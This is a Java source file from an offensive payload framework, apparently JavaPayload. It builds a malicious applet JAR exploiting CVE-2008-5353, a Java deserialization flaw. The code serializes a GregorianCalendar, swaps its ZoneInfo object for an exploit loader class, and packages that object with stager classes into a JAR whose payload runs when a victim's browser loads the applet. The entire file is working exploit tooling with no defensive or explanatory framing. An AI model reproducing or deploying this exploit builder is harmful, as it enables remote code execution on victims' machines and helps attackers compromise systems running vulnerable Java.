package javapayload.builder;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.util.jar.Manifest;

public class CVE_2008_5353_AppletJarBuilder {
	public static void main(String[] args) throws Exception {
		if (args.length == 0) {
			System.out.println("Usage: java javapayload.builder.CVE_2008_5353_AppletJarBuilder "+JarBuilder.ARGS_SYNTAX);
			return;
		}
		final Class[] baseClasses = new Class[] {
				javapayload.exploit.CVE_2008_5353.class,
				javapayload.exploit.DeserializationExploit.class,
				javapayload.exploit.DeserializationExploit.Loader.class,
				javapayload.loader.AppletLoader.class,
				javapayload.loader.AppletLoader.ReadyNotifier.class,
				javapayload.stager.Stager.class,
		};		
		ByteArrayOutputStream baos = new ByteArrayOutputStream();
		ObjectOutputStream oos = new ObjectOutputStream(baos) {
			{enableReplaceObject(true);}
			
			protected Object replaceObject(Object obj) throws IOException {
				if (obj instanceof sun.util.calendar.ZoneInfo)
					return new javapayload.exploit.DeserializationExploit.Loader();
				return obj;
			}
		};
		oos.writeObject(new java.util.GregorianCalendar());
		oos.close();
		JarBuilder.buildJarFromArgs(args, "CVE_2008_5353_Applet", baseClasses, new Manifest(), "x", baos.toByteArray());
	}
}
